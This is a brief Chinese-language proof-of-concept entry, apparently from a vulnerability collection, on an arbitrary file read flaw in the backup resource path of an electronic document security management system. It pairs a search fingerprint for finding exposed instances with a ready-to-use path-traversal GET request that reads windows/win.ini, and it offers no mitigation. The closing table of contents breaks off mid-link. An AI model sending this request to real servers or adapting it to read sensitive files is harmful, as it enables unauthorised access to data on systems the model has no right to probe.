# 电子文档安全管理系统backup存在任意文件读取漏洞

电子文档安全管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="docsafe/docsafe.nocache.js"`
- **请求**：`GET /resources/backup/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1`
- **其他**：电子文档安全管理系统backup存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* [四、漏洞复现](#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%